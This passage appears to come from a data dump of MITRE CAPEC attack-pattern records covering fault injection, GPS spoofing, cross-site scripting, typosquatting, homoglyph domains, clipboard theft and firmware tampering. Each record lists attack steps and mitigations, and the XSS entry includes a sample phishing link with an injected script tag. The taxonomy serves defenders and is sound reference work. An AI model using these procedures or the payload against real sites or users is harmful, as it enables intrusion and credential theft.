in the system in order to leverage them for exploitation.::\",\"::SKILL:Adversaries require non-trivial technical skills to create and implement fault injection attacks. Although this style of attack has become easier (commercial equipment and training classes are available to perform these attacks), they usual require significant setup and experimentation time during which physical access to the device is required.:LEVEL:High::\",\"::The relevant sensors and tools to detect and analyze fault/side-channel data from a system. A tool capable of injecting fault/side-channel data into a system or application.::\",\"\",\"::SCOPE:Confidentiality:TECHNICAL IMPACT:Read Data:TECHNICAL IMPACT:Bypass Protection Mechanism:TECHNICAL IMPACT:Hide Activities:NOTE:An adversary capable of successfully collecting and analyzing sensitive, fault/side-channel information, has compromised the confidentiality of that application or information system data.::SCOPE:Integrity:TECHNICAL IMPACT:Execute Unauthorized Commands:NOTE:If an adversary is able to inject data via a fault or side channel vulnerability towards malicious ends, the integrity of the application or information system will be compromised.::\",\"::Implement robust physical security countermeasures and monitoring.::\",\"\",\"::1247::1248::1256::1319::1332::1334::1338::1351::\",\"\",\"TYPE:Other:NOTE:Considerable effort on the part of the adversary is often required in order to detect and analyze fault/side channel data.::\",\n625,\"Mobile Device Fault Injection\",Standard,Draft,\"Fault injection attacks against mobile devices use disruptive signals or events (e.g. electromagnetic pulses, laser pulses, clock glitches, etc.) to cause faulty behavior. When performed in a controlled manner on devices performing cryptographic operations, this faulty behavior can be exploited to derive secret key information. Although this attack usually requires physical control of the mobile device, it is non-destructive, and the device can be used after the attack without any indication that secret keys were compromised.\",\"\",,,\"::NATURE:ChildOf:CAPEC ID:624::\",\"\",\"\",\"::SKILL:Adversaries require non-trivial technical skills to create and implement fault injection attacks on mobile devices. Although this style of attack has become easier (commercial equipment and training classes are available to perform these attacks), they usual require significant setup and experimentation time during which physical access to the device is required. This prerequisite makes the attack challenging to perform (assuming that physical security countermeasures and monitoring are in place).:LEVEL:High::\",\"\",\"\",\"::SCOPE:Confidentiality:SCOPE:Access Control:TECHNICAL IMPACT:Read Data:NOTE:Extract long-term secret keys (e.g. keys used for VPN or WiFi authentication and encryption) to enable decryption of intercepted VOIP traffic.::\",\"::Strong physical security of all devices that contain secret key information. (even when devices are not in use)::Frequent changes to secret keys and certificates.::\",\"\",\"::1247::1248::1256::1319::1332::1334::1338::1351::\",\"\",\"\",\n626,\"Smudge Attack\",Detailed,Draft,\"Attacks that reveal the password/passcode pattern on a touchscreen device by detecting oil smudges left behind by the user’s fingers.\",\"\",,,\"::NATURE:ChildOf:CAPEC ID:395::\",\"\",\"::The attacker must have physical access to the device.::\",\"::SKILL:The attacker must know how to make use of these smudges.:LEVEL:Medium::\",\"\",\"\",\"::SCOPE:Access Control:TECHNICAL IMPACT:Bypass Protection Mechanism::\",\"::Strong physical security of the device.::\",\"\",\"\",\"\",\"\",\n627,\"Counterfeit GPS Signals\",Standard,Draft,\"An adversary attempts to deceive a GPS receiver by broadcasting counterfeit GPS signals, structured to resemble a set of normal GPS signals. These spoofed signals may be structured in such a way as to cause the receiver to estimate its position to be somewhere other than where it actually is, or to be located where it is but at a different time, as determined by the adversary.\",\"\",Low,High,\"::NATURE:ChildOf:CAPEC ID:148::\",\"\",\"::The target must be relying on valid GPS signal to perform critical operations.::\",\"::SKILL:The ability to spoof GPS signals is not trival.:LEVEL:High::\",\"::Ability to create spoofed GPS signals.::\",\"\",\"::SCOPE:Integrity:TECHNICAL IMPACT:Modify Data::\",\"\",\"\",\"\",\"\",\"\",\n628,\"Carry-Off GPS Attack\",Detailed,Draft,\"A common form of a GPS spoofing attack, commonly termed a carry-off attack begins with an adversary broadcasting signals synchronized with the genuine signals observed by the target receiver. The power of the counterfeit signals is then gradually increased and drawn away from the genuine signals. Over time, the adversary can carry the target away from their intended destination and toward a location chosen by the adversary.\",\"\",Low,High,\"::NATURE:ChildOf:CAPEC ID:627::\",\"\",\"::The target must be relying on valid GPS signal to perform critical operations.::\",\"::SKILL:This attack requires advanced knoweldge in GPS technology.:LEVEL:High::\",\"\",\"\",\"\",\"\",\"::A proof-of-concept attack was successfully performed in June, 2013, when the luxury yacht White Rose was misdirected with spoofed GPS signals from Monaco to the island of Rhodes by a group of aerospace engineering students from the Cockrell School of Engineering at the University of Texas in Austin. The students were aboard the yacht, allowing their spoofing equipment to gradually overpower the signal strengths of the actual GPS constellation satellites, altering the course of the yacht.::\",\"\",\"\",\"\",\n63,\"Cross-Site Scripting (XSS)\",Standard,Draft,\"An adversary embeds malicious scripts in content that will be served to web browsers. The goal of the attack is for the target software, the client-side browser, to execute the script with the users' privilege level. An attack of this type exploits a programs' vulnerabilities that are brought on by allowing remote hosts to execute code and scripts. Web browsers, for example, have some simple security controls in place, but if a remote attacker is allowed to execute scripts (through injecting them in to user-generated content like bulletin boards) then these controls may be bypassed. Further, these attacks are very difficult for an end user to detect.\",\"\",High,Very High,\"::NATURE:ChildOf:CAPEC ID:242::NATURE:CanPrecede:CAPEC ID:107::\",\"::STEP:1:PHASE:Explore:DESCRIPTION:[Survey the application for user-controllable inputs] Using a browser or an automated tool, an attacker follows all public links and actions on a web site. They record all the links, the forms, the resources accessed and all other potential entry-points for the web application.:TECHNIQUE:Use a spidering tool to follow and record all links and analyze the web pages to find entry points. Make special note of any links that include parameters in the URL.:TECHNIQUE:Use a proxy tool to record all links visited during a manual traversal of the web application.:TECHNIQUE:Use a browser to manually explore the website and analyze how it is constructed. Many browsers' plugins are available to facilitate the analysis or automate the discovery.::STEP:2:PHASE:Experiment:DESCRIPTION:[Probe identified potential entry points for XSS vulnerability] The attacker uses the entry points gathered in the Explore phase as a target list and injects various common script payloads to determine if an entry point actually represents a vulnerability and to characterize the extent to which the vulnerability can be exploited.:TECHNIQUE:Use a list of XSS probe strings to inject script in parameters of known URLs. If possible, the probe strings contain a unique identifier.:TECHNIQUE:Use a proxy tool to record results of manual input of XSS probes in known URLs.:TECHNIQUE:Use a list of XSS probe strings to inject script into UI entry fields. If possible, the probe strings contain a unique identifier.:TECHNIQUE:Use a list of XSS probe strings to inject script into resources accessed by the application. If possible, the probe strings contain a unique identifier.::STEP:3:PHASE:Exploit:DESCRIPTION:[Steal session IDs, credentials, page content, etc.] As the attacker succeeds in exploiting the vulnerability, they can choose to steal user's credentials in order to reuse or to analyze them later on.:TECHNIQUE:Develop malicious JavaScript that is injected through vectors identified during the Experiment Phase and loaded by the victim's browser and sends document information to the attacker.:TECHNIQUE:Develop malicious JavaScript that injected through vectors identified during the Experiment Phase and takes commands from an attacker's server and then causes the browser to execute appropriately.::STEP:4:PHASE:Exploit:DESCRIPTION:[Forceful browsing] When the attacker targets the current application or another one (through CSRF vulnerabilities), the user will then be the one who perform the attacks without being aware of it. These attacks are mostly targeting application logic flaws, but it can also be used to create a widespread attack against a particular website on the user's current network (Internet or not).:TECHNIQUE:Develop malicious JavaScript that is injected through vectors identified during the Experiment Phase and loaded by the victim's browser and performs actions on the same web site:TECHNIQUE:Develop malicious JavaScript that injected through vectors identified during the Experiment Phase and takes commands from an attacker's server and then causes the browser to execute request to other web sites (especially the web applications that have CSRF vulnerabilities).::STEP:5:PHASE:Exploit:DESCRIPTION:[Content spoofing] By manipulating the content, the attacker targets the information that the user would like to get from the website.:TECHNIQUE:Develop malicious JavaScript that is injected through vectors identified during the Experiment Phase and loaded by the victim's browser and exposes attacker-modified invalid information to the user on the current web page.::\",\"::Target client software must be a client that allows scripting communication from remote hosts, such as a JavaScript-enabled Web Browser.::\",\"::SKILL:To achieve a redirection and use of less trusted source, an attacker can simply place a script in bulletin board, blog, wiki, or other user-generated content site that are echoed back to other client machines.:LEVEL:Low::SKILL:Exploiting a client side vulnerability to inject malicious scripts into the browser's executable process.:LEVEL:High::\",\"::Ability to deploy a custom hostile service for access by targeted clients. Ability to communicate synchronously or asynchronously with client machine.::\",\"\",\"::SCOPE:Confidentiality:SCOPE:Integrity:SCOPE:Availability:TECHNICAL IMPACT:Execute Unauthorized Commands:NOTE:Run Arbitrary Code::SCOPE:Integrity:TECHNICAL IMPACT:Modify Data::SCOPE:Confidentiality:TECHNICAL IMPACT:Read Data::\",\"::Design: Use browser technologies that do not allow client side scripting.::Design: Utilize strict type, character, and encoding enforcement::Design: Server side developers should not proxy content via XHR or other means, if a http proxy for remote content is setup on the server side, the client's browser has no way of discerning where the data is originating from.::Implementation: Ensure all content that is delivered to client is sanitized against an acceptable content specification.::Implementation: Perform input validation for all remote content.::Implementation: Perform output validation for all remote content.::Implementation: Session tokens for specific host::Implementation: Patching software. There are many attack vectors for XSS on the client side and the server side. Many vulnerabilities are fixed in service packs for browser, web servers, and plug in technologies, staying current on patch release that deal with XSS countermeasures mitigates this.::\",\"::Classic phishing attacks lure users to click on content that appears trustworthy, such as logos, and links that seem to go to their trusted financial institutions and online auction sites. But instead the attacker appends malicious scripts into the otherwise innocent appearing resources. The HTML source for a standard phishing attack looks like this: <a href=www.exampletrustedsite.com?Name=<script>maliciousscript</script>>Trusted Site</a> When the user clicks the link, the appended script also executes on the local user's machine.::\",\"::79::20::\",\"TAXONOMY NAME:WASC:ENTRY ID:08:ENTRY NAME:Cross-Site Scripting::::TAXONOMY NAME:OWASP Attacks:ENTRY NAME:Cross Site Scripting (XSS)::\",\"\",\n630,\"TypoSquatting\",Detailed,Draft,\"An adversary registers a domain name with at least one character different than a trusted domain. A TypoSquatting attack takes advantage of instances where a user mistypes a URL (e.g. www.goggle.com) or not does visually verify a URL before clicking on it (e.g. phishing attack). As a result, the user is directed to an adversary-controlled destination. TypoSquatting does not require an attack against the trusted domain or complicated reverse engineering.\",\"\",Low,Medium,\"::NATURE:ChildOf:CAPEC ID:616::NATURE:CanPrecede:CAPEC ID:89::NATURE:CanPrecede:CAPEC ID:543::\",\"::STEP:1:PHASE:Explore:DESCRIPTION:[Determine target website] The adversary first determines which website to impersonate, generally one that is trusted and receives a consistent amount of traffic.:TECHNIQUE:Research popular or high traffic websites.::STEP:2:PHASE:Experiment:DESCRIPTION:[Impersonate trusted domain] In order to impersonate the trusted domain, the adversary needs to register the TypoSquatted URL.:TECHNIQUE:Register the TypoSquatted domain.::STEP:3:PHASE:Exploit:DESCRIPTION:[Deceive user into visiting domain] Finally, the adversary needs to deceive a user into visiting the TypoSquatted domain.:TECHNIQUE:Execute a phishing attack and send a user an e-mail convincing the user to click on a link leading the user to the TypoSquatted domain.:TECHNIQUE:Assume that a user will incorrectly type the legitimate URL, leading the user to the TypoSquatted domain.::\",\"::An adversary requires knowledge of popular or high traffic domains, that could be used to deceive potential targets.::\",\"::SKILL:Adversaries must be able to register DNS hostnames/URL’s.:LEVEL:Low::\",\"\",\"\",\"::SCOPE:Other:TECHNICAL IMPACT:Other:NOTE:Depending on the intention of the adversary, a successful TypoSquatting attack can be leveraged to execute more complex attacks such as cross-site scripting or stealing account credentials.::\",\"::Authenticate all servers and perform redundant checks when using DNS hostnames.::Purchase potential TypoSquatted domains and forward to legitimate domain.::\",\"::An adversary sends an email, impersonating paypal.com, to a user stating that they have just received a money transfer and to click the given link to obtain their money. However, the link the in email is paypa1.com instead of paypal.com, which the user clicks without fully reading the link. The user is directed to the adversary's website, which appears as if it is the legitimate paypal.com login page. The user thinks they are logging into their account, but have actually just given their paypal credentials to the adversary. The adversary can now use the user's legitimate paypal credentials to log into the user's account and steal any money which may be in the account. TypoSquatting vulnerability allows an adversary to impersonate a trusted domain and trick a user into visiting the malicious website to steal user credentials.::\",\"\",\"\",\"\",\n631,\"SoundSquatting\",Detailed,Draft,\"An adversary registers a domain name that sounds the same as a trusted domain, but has a different spelling. A SoundSquatting attack takes advantage of a user's confusion of the two words to direct Internet traffic to adversary-controlled destinations. SoundSquatting does not require an attack against the trusted domain or complicated reverse engineering.\",\"::TERM:Homophone Attack:DESCRIPTION:::\",Low,Medium,\"::NATURE:ChildOf:CAPEC ID:616::NATURE:CanPrecede:CAPEC ID:89::NATURE:CanPrecede:CAPEC ID:543::\",\"::STEP:1:PHASE:Explore:DESCRIPTION:[Determine target website] The adversary first determines which website to impersonate, generally one that is trusted, receives a consistent amount of traffic, and is a homophone.:TECHNIQUE:Research popular or high traffic websites which are also homophones.::STEP:2:PHASE:Experiment:DESCRIPTION:[Impersonate trusted domain] In order to impersonate the trusted domain, the adversary needs to register the SoundSquatted URL.:TECHNIQUE:Register the SoundSquatted domain.::STEP:3:PHASE:Exploit:DESCRIPTION:[Deceive user into visiting domain] Finally, the adversary needs to deceive a user into visiting the SoundSquatted domain.:TECHNIQUE:Execute a phishing attack and send a user an e-mail convincing the user to click on a link leading the user to the SoundSquatted domain.:TECHNIQUE:Assume that a user will unintentionally use the homophone in the URL, leading the user to the SoundSquatted domain.::\",\"::An adversary requires knowledge of popular or high traffic domains, that could be used to deceive potential targets.::\",\"::SKILL:Adversaries must be able to register DNS hostnames/URL’s.:LEVEL:Low::\",\"\",\"\",\"::SCOPE:Other:TECHNICAL IMPACT:Other:NOTE:Depending on the intention of the adversary, a successful SoundSquatting attack can be leveraged to execute more complex attacks such as cross-site scripting or stealing account credentials.::\",\"::Authenticate all servers and perform redundant checks when using DNS hostnames.::Purchase potential SoundSquatted domains and forward to legitimate domain.::\",\"::An adversary sends an email, impersonating the popular banking website guaranteebanking.com, to a user stating that they have just received a new deposit and to click the given link to confirm the deposit. However, the link the in email is guarantybanking.com instead of guaranteebanking.com, which the user clicks without fully reading the link. The user is directed to the adversary's website, which appears as if it is the legitimate guaranteebanking.com login page. The user thinks they are logging into their account, but have actually just given their guaranteebanking.com credentials to the adversary. The adversary can now use the user's legitimate guaranteebanking.com credentials to log into the user's account and steal any money which may be in the account.See also: SoundSquatting vulnerability allows an adversary to impersonate a trusted domain and leverages a user's confusion between the meaning of two words which are pronounced the same into visiting the malicious website to steal user credentials.::\",\"\",\"\",\"\",\n632,\"Homograph Attack via Homoglyphs\",Detailed,Draft,\"An adversary registers a domain name containing a homoglyph, leading the registered domain to appear the same as a trusted domain. A homograph attack leverages the fact that different characters among various character sets look the same to the user. Homograph attacks must generally be combined with other attacks, such as phishing attacks, in order to direct Internet traffic to the adversary-controlled destinations.\",\"::TERM:Homoglyph Attack:DESCRIPTION:::\",Low,Medium,\"::NATURE:ChildOf:CAPEC ID:616::NATURE:CanPrecede:CAPEC ID:89::NATURE:CanPrecede:CAPEC ID:543::\",\"::STEP:1:PHASE:Explore:DESCRIPTION:[Determine target website] The adversary first determines which website to impersonate, generally one that is trusted and receives a consistent amount of traffic.:TECHNIQUE:Research popular or high traffic websites.::STEP:2:PHASE:Experiment:DESCRIPTION:[Impersonate trusted domain] In order to impersonate the trusted domain, the adversary needs to register the URL containing the homoglpyh character(s).:TECHNIQUE:Register the Homograph domain.::STEP:3:PHASE:Exploit:DESCRIPTION:[Deceive user into visiting domain] Finally, the adversary needs to deceive a user into visiting the Homograph domain.:TECHNIQUE:Execute a phishing attack and send a user an e-mail convincing the to click on a link leading the user to the malicious domain.::\",\"::An adversary requires knowledge of popular or high traffic domains, that could be used to deceive potential targets.::\",\"::SKILL:Adversaries must be able to register DNS hostnames/URL’s.:LEVEL:Low::\",\"\",\"\",\"::SCOPE:Other:TECHNICAL IMPACT:Other:NOTE:Depending on the intention of the adversary, a successful Homograph attack can be leveraged to execute more complex attacks such as cross-site scripting or stealing account credentials.::\",\"::Authenticate all servers and perform redundant checks when using DNS hostnames.::Utilize browsers that can warn users if URLs contain characters from different character sets.::\",\"::An adversary sends an email, impersonating bankofamerica.com to a user stating that they have just received a new deposit and to click the given link to confirm the deposit. However, the link the in email is bankofamerica.com, where the 'a' and 'e' characters are Cyrillic and not ASCII, instead of bankofamerica.com (all ASCII), which the user clicks after carefully reading the URL, making sure that typosquatting and soundsquatting attacks are not being leveraged against them. The user is directed to the adversary's website, which appears as if it is the legitimate bankofamerica.com login page. The user thinks they are logging into their account, but have actually just given their bankofamerica.com credentials to the adversary. The adversary can now use the user's legitimate bankofamerica.com credentials to log into the user's account and steal any money which may be in the account. Homograph vulnerability allows an adversary to impersonate a trusted domain by leveraging homoglyphs and tricking a user into visiting the malicious website to steal user credentials.See also: CVE-2012-0584 CVE-2009-0652 CVE-2005-0233 CVE-2005-0234 CVE-2005-0235 CVE-2005-0236 CVE-2005-0237 CVE-2005-0238::\",\"::1007::\",\"\",\"\",\n633,\"Token Impersonation\",Detailed,Stable,\"An adversary exploits a weakness in authentication to create an access token (or equivalent) that impersonates a different entity, and then associates a process/thread to that that impersonated token. This action causes a downstream user to make a decision or take action that is based on the assumed identity, and not the response that blocks the adversary.\",\"\",,Medium,\"::NATURE:ChildOf:CAPEC ID:194::\",\"\",\"::This pattern of attack is only applicable when a downstream user leverages tokens to verify identity, and then takes action based on that identity.::\",\"\",\"\",\"\",\"::SCOPE:Integrity:TECHNICAL IMPACT:Alter Execution Logic:NOTE:By faking the source of data or services, an adversary can cause a target to make incorrect decisions about how to proceed.::SCOPE:Integrity:TECHNICAL IMPACT:Gain Privileges:NOTE:By impersonating identities that have an increased level of access, an adversary gain privilege that they many not have otherwise had.::SCOPE:Integrity:TECHNICAL IMPACT:Hide Activities:NOTE:Faking the source of data or services can be used to create a false trail in logs as the target will associated any actions with the impersonated identity instead of the adversary.::\",\"\",\"\",\"::287::1270::\",\"TAXONOMY NAME:ATTACK:ENTRY ID:1134:ENTRY NAME:Access Token Manipulation::\",\"\",\n634,\"Probe Audio and Video Peripherals\",Detailed,Stable,\"The adversary exploits the target system's audio and video functionalities through malware or scheduled tasks. The goal is to capture sensitive information about the target for financial, personal, political, or other gains which is accomplished by collecting communication data between two parties via the use of peripheral devices (e.g. microphones and webcams) or applications with audio and video capabilities (e.g. Skype) on a system.\",\"\",Low,High,\"::NATURE:ChildOf:CAPEC ID:651::NATURE:ChildOf:CAPEC ID:545::\",\"\",\"::Knowledge of the target device's or application’s vulnerabilities that can be capitalized on with malicious code. The adversary must be able to place the malicious code on the target device.::\",\"::SKILL:To deploy a hidden process or malware on the system to automatically collect audio and video data.:LEVEL:High::\",\"\",\"\",\"::SCOPE:Confidentiality:TECHNICAL IMPACT:Read Data::\",\"::Prevent unknown code from executing on a system through the use of an allowlist policy.::Patch installed applications as soon as new updates become available.::\",\"::An adversary can capture audio and video, and transmit the recordings to a C2 server or a similar capability.::An adversary can capture and record from audio peripherals in a vehicle via a Car Whisperer attack. If an adversary is within close proximity to a vehicle with Bluetooth capabilities, they may attempt to connect to the hands-free system when it is in pairing mode. With successful authentication, if an authentication system is present at all, an adversary may be able to play music/voice recordings, as well begin a recording and capture conversations happening inside the vehicle. Successful authentication relies on the pairing security key being set to a default value, or by brute force (which may be less practical in an outside environment) Depending on the sensitivity of the information being discussed, this scenario can be extremely compromising.::An adversary may also use a technique called Bluebugging, which is similar to Bluesnarfing but requires the adversary to be between 10-15 meters of the target device. Bluebugging creates a backdoor for an attacker to listen/record phone calls, forward calls, send SMS and retrieve the phonebook.::\",\"::267::\",\"TAXONOMY NAME:ATTACK:ENTRY ID:1123:ENTRY NAME:Audio Capture::::TAXONOMY NAME:ATTACK:ENTRY ID:1125:ENTRY NAME:Video Capture::\",\"\",\n635,\"Alternative Execution Due to Deceptive Filenames\",Standard,Draft,\"The extension of a file name is often used in various contexts to determine the application that is used to open and use it. If an attacker can cause an alternative application to be used, it may be able to execute malicious code, cause a denial of service or expose sensitive information.\",\"\",,High,\"::NATURE:ChildOf:CAPEC ID:165::\",\"\",\"::The use of the file must be controlled by the file extension.::\",\"\",\"\",\"\",\"\",\"::Applications should insure that the content of the file is consistent with format it is expecting, and not depend solely on the file extension.::\",\"\",\"::162::\",\"TAXONOMY NAME:ATTACK:ENTRY ID:1036.007:ENTRY NAME:Masquerading: Double File Extension::\",\"\",\n636,\"Hiding Malicious Data or Code within Files\",Standard,Draft,\"Files on various operating systems can have a complex format which allows for the storage of other data, in addition to its contents. Often this is metadata about the file, such as a cached thumbnail for an image file. Unless utilities are invoked in a particular way, this data is not visible during the normal use of the file. It is possible for an attacker to store malicious data or code using these facilities, which would be difficult to discover.\",\"\",,High,\"::NATURE:ChildOf:CAPEC ID:165::\",\"\",\"::The operating system must support a file system that allows for alternate data storage for a file.::\",\"\",\"\",\"\",\"\",\"::Many tools are available to search for the hidden data. Scan regularly for such data using one of these tools.::\",\"\",\"::506::\",\"TAXONOMY NAME:ATTACK:ENTRY ID:1001.002:ENTRY NAME:Data Obfuscation: Steganography::::TAXONOMY NAME:ATTACK:ENTRY ID:1027.003:ENTRY NAME:Obfuscated Files or Information: Steganography::::TAXONOMY NAME:ATTACK:ENTRY ID:1027.004:ENTRY NAME:Obfuscated Files or Information: Compile After Delivery::::TAXONOMY NAME:ATTACK:ENTRY ID:1218.001:ENTRY NAME:Signed Binary Proxy Execution: Compiled HTML File::::TAXONOMY NAME:ATTACK:ENTRY ID:1221:ENTRY NAME:Template Injection::\",\"\",\n637,\"Collect Data from Clipboard\",Detailed,Stable,\"The adversary exploits an application that allows for the copying of sensitive data or information by collecting information copied to the clipboard. Data copied to the clipboard can be accessed by other applications, such as malware built to exfiltrate or log clipboard contents on a periodic basis. In this way, the adversary aims to garner information to which they are unauthorized.\",\"\",Low,Low,\"::NATURE:ChildOf:CAPEC ID:150::\",\"::STEP:1:PHASE:Explore:DESCRIPTION:[Find an application that allows copying sensititve data to clipboad] An adversary first needs to find an application that allows copying and pasting of sensitive information. This could be an application that prints out temporary passwords to the screen, private email addresses, or any other sensitive information or data::STEP:2:PHASE:Experiment:DESCRIPTION:[Target users of the application] An adversary will target users of the application in order to obtain the information in their clipboard on a periodic basic:TECHNIQUE:Install malware on a user's system designed to log clipboard contents periodically:TECHNIQUE:Get the user to click on a malicious link that will bring them to an application to log the contents of the clipboard::STEP:3:PHASE:Exploit:DESCRIPTION:[Follow-up attack] Use any sensitive information found to carry out a follow-up attack::\",\"::The adversary must have a means (i.e., a pre-installed tool or background process) by which to collect data from the clipboard and store it. That is, when the target copies data to the clipboard (e.g., to paste into another application), the adversary needs some means of capturing that data in a third location.::\",\"::SKILL:To deploy a hidden process or malware on the system to automatically collect clipboard data.:LEVEL:High::\",\"\",\"\",\"::SCOPE:Confidentiality:TECHNICAL IMPACT:Read Data::\",\"::While copying and pasting of data with the clipboard is a legitimate and practical function, certain situations and context may require the disabling of this feature. Just as certain applications disable screenshot capability, applications that handle highly sensitive information should consider disabling copy and paste functionality.::Employ a robust identification and audit/blocking via using an allowlist of applications on your system. Malware may contain the functionality associated with this attack pattern.::\",\"\",\"::267::\",\"TAXONOMY NAME:ATTACK:ENTRY ID:1115:ENTRY NAME:Clipboard Data::\",\"\",\n638,\"Altered Component Firmware\",Detailed,Stable,\"An adversary exploits systems features and/or improperly protected firmware of hardware components, such as Hard Disk Drives (HDD), with the goal of executing malicious code from within the component's Master Boot Record (MBR). Conducting this type of attack entails the adversary infecting the target with firmware altering malware, using known tools, and a payload. Once this malware is executed, the MBR is modified to include instructions to execute the payload at desired intervals and when the system is booted up. A successful attack will obtain persistence within the victim system even if the operating system is reinstalled and/or if the component is formatted or has its data erased.\",\"\",Low,Very High,\"::NATURE:ChildOf:CAPEC ID:452::\",\"::STEP:1:PHASE:Explore:DESCRIPTION:[Select Target] The adversary searches for a suitable target to attack, such as government and/or private industry organizations.:TECHNIQUE:Conduct reconnaissance to determine potential targets to exploit.::STEP:2:PHASE:Explore:DESCRIPTION:[Identify Components] After selecting a target, the adversary determines whether a vulnerable component, such as a specific make and model of a HDD, is contained within the target system.:TECHNIQUE:[Remote Access Vector] The adversary gains remote access to the target, typically via additional malware, and explores the system to determine hardware components that are being leveraged.:TECHNIQUE:[Physical Access Vector] The adversary intercepts components in transit and determines if the component is vulnerable to attack.::STEP:3:PHASE:Experiment:DESCRIPTION:[Optional: Create Payload] If not using an already existing payload, the adversary creates their own to be executed at defined intervals and upon system boot processes. This payload may then be tested on the target system or a test system to confirm its functionality.::STEP:4:PHASE:Exploit:DESCRIPTION:[Insert Firmware Altering Malware] Once a vulnerable component has been identified, the adversary leverages known malware tools to infect the component's firmware and drop the payload within the component's MBR. This allows the adversary to maintain persistence on the target and execute the payload without being detected.:TECHNIQUE:The adversary inserts the firmware altering malware on the target component, via the use of known malware tools.:TECHNIQUE:[Physical Access Vector] The adversary then sends the component to its original intended destination, where it will be installed onto a victim system.::\",\"::Advanced knowledge about the target component's firmware::Advanced knowledge about Master Boot Records (MBR)::Advanced knowledge about tools used to insert firmware altering malware.::Advanced knowledge about component shipments to the target organization.::\",\"::SKILL:Ability to access and reverse engineer hardware component firmware.:LEVEL:High::SKILL:Ability to intercept components in transit.:LEVEL:High::SKILL:Ability to create malicious payload to be executed from MBR.:LEVEL:Medium::SKILL:Ability to leverage known malware tools to infect target system and insert firmware altering malware/payload:LEVEL:Low::\",\"::Manufacturer source code for hardware components.::Malware tools used to insert malware and payload onto target component.::Either remote or physical access to the target component.::\",\"::Output observed from processes, API calls, or Self-Monitoring, Analysis and Reporting Technology (SMART) may provide insight into malicious modifications of MBRs.::Digital forensics tools may produce output that indicates an attack of this nature has occurred. Examples include unexpected disk partitions and/or unusual strings.::\",\"::SCOPE:Authentication:SCOPE:Authorization:TECHNICAL IMPACT:Gain Privileges:TECHNICAL IMPACT:Execute Unauthorized Commands:TECHNICAL IMPACT:Bypass Protection Mechanism:TECHNICAL IMPACT:Hide Activities::SCOPE:Confidentiality:SCOPE:Access Control:TECHNICAL IMPACT:Read Data:TECHNICAL IMPACT:Modify Data::\",\"::Leverage hardware components known to not be susceptible to these types of attacks.::Implement hardware RAID infrastructure.::\",\"::In 2014, the Equation group was observed levering known malware tools to conduct component firmware alteration attacks against hard drives. In total, 12 HDD categories were shown to be vulnerable from manufacturers such as Western Digital, HGST, Samsung, and Seagate. Because of their complexity, only a few victims were targeted by these attacks. [REF-664]::\",\"\",\"TAXONOMY NAME:ATTACK:ENTRY ID:1542.002:ENTRY NAME:Pre-OS Boot:Component Firmware::\",\"\",\n639,\"Probe System Files\",Detailed,Stable,\"An adversary obtains unauthorized information due to improperly protected files. If an application stores sensitive information in a file that is not protected by proper access control, then an adversary can access the file and search for sensitive information.\",\"\",,Medium,\"::NATURE:ChildOf:CAPEC ID:545::\",\"\",\"::An adversary has access to the file system of a system.::\",\"\",\"\",\"\",\"::SCOPE:Confidentiality:TECHNICAL IMPACT:Read Data::\",\"::Verify that files have proper access controls set, and reduce the storage of sensitive information to only what is necessary.::\",\"::Adversaries may search local file systems and remote file shares for files containing passwords. These can be files created by users to store their own credentials, shared credential stores for a group of individuals, configuration files containing passwords for a system or service, or source code/binary files containing embedded passwords.::Adversaries may search network shares on computers they have compromised to find files of interest.::\",\"::552::\",\"TAXONOMY NAME:ATTACK:ENTRY ID:1039:ENTRY NAME:Data from Network Shared Drive::::TAXONOMY NAME:ATTACK:ENTRY ID:1552.001:ENTRY NAME:Unsecured Credentials: Credentials in Files::::TAXONOMY NAME:ATTACK:ENTRY ID:1552.003:ENTRY NAME:Unsecured Credentials: Bash History::::TAXONOMY NAME:ATTACK:ENTRY ID:1552.004:ENTRY NAME:Unsecured Credentials: Private Keys::::TAXONOMY NAME:ATTACK:ENTRY ID:1552.006:ENTRY NAME:Unsecured Credentials: Group Policy Preferences::\",\"\","
  },
  "doc-825b89bbd40dffdd78a2ac11486d29e9": {
    "content": "'ID,Name,Abstraction,Status,Description,Alternate Terms,Likelihood Of Attack,Typical Severity,Related Attack Patterns,Execution Flow,Prerequisites,Skills Required,Resources Required,Indicators,Consequences,Mitigations,Example Instances,Related Weaknesses,Taxonomy Mappings,Notes\n64,\"Using Slashes and URL Encoding Combined to Bypass Validation Logic\",Detailed,Draft,\"This attack targets the encoding of the URL combined with the encoding of the slash characters. An attacker can take advantage of the multiple ways of encoding a URL and abuse the interpretation of the URL. A URL may contain special character that need special syntax handling in order to be interpreted. Special characters are represented using a percentage character followed by two digits representing the octet code of the original character (%HEX-CODE). For instance US-ASCII space character would be represented with %20. This is often referred as escaped ending or percent-encoding. Since the server decodes the URL from the requests, it may restrict the access to some URL paths by validating and filtering out the URL requests it received. An attacker will try to craft an URL with a sequence of special characters which once interpreted by the server will be equivalent to a forbidden URL. It can be difficult to protect against this attack since the URL can contain other format of encoding such as UTF-8 encoding, Unicode-encoding, etc.\",\"\",High,High,\"::NATURE:ChildOf:CAPEC ID:267::\",\"::STEP:1:PHASE:Explore:DESCRIPTION:The attacker accesses the server using a specific URL.::STEP:2:PHASE:Experiment:DESCRIPTION:The attacker tries to encode some special characters in the URL. The attacker find out that some characters are not filtered properly.::STEP:3:PHASE:Exploit:DESCRIPTION:The attacker crafts a malicious URL string request and sends it to the server.::STEP:4:PHASE:Exploit:DESCRIPTION:The server decodes and interprets the URL string. Unfortunately since the input filtering is not done properly, the special characters have harmful consequences.::\",\"::The application accepts and decodes URL string request.::The application performs insufficient filtering/canonicalization on the URLs.::\",\"::SKILL:An attacker can try special characters in the URL and bypass the URL validation.:LEVEL:Low::SKILL:The attacker may write a script to defeat the input filtering mechanism.:LEVEL:Medium::\",\"\",\"::If the first decoding process has left some invalid or denylisted characters, that may be a sign that the request is malicious.::Traffic filtering with IDS (or proxy) can detect requests with suspicious URLs. IDS may use signature based identification to reveal such URL based attacks.::\",\"::SCOPE:Availability:TECHNICAL IMPACT:Resource Consumption:NOTE:Denial of Service::SCOPE:Confidentiality:SCOPE:Integrity:SCOPE:Availability:TECHNICAL IMPACT:Execute Unauthorized Commands:NOTE:Run Arbitrary Code::SCOPE:Confidentiality:TECHNICAL IMPACT:Read Data::SCOPE:Confidentiality:SCOPE:Access Control:SCOPE:Authorization:TECHNICAL IMPACT:Gain Privileges::\",\"::Assume all input is malicious. Create an allowlist that defines all valid input to the software system based on the requirements specifications. Input that does not match against the allowlist should not be permitted to enter into the system. Test your decoding process against malicious input.::Be aware of the threat of alternative method of data encoding and obfuscation technique such as IP address encoding.::When client input is required from web-based forms, avoid using the GET method to submit data, as the method causes the form data to be appended to the URL and is easily manipulated. 